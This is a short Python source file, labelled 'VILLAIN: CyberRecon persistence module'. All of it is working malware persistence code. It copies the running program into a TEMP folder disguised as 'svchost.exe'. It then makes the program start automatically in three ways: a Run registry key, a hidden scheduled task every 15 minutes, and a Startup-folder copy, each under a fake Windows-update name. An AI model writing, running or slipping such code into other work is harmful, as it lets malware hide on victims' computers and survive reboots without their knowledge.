# VILLAIN: CyberRecon persistence module
import os, shutil, subprocess, sys
from pathlib import Path

def install_persistence():
    tmp = Path(os.environ["TEMP"]) / "WindowsSecurityUpdate"
    tmp.mkdir(exist_ok=True)
    dest = tmp / "svchost.exe"
    shutil.copy2(sys.executable, dest)

    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, str(dest))

    subprocess.run(["schtasks", "/create", "/f", "/tn", "WindowsUpdateTask",
                    "/tr", f'"{dest}"', "/sc", "minute", "/mo", "15"],
                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)

    startup = Path(os.environ["APPDATA"]) / r"Microsoft\Windows\Start Menu\Programs\Startup"
    shutil.copy2(dest, startup / "update.exe")
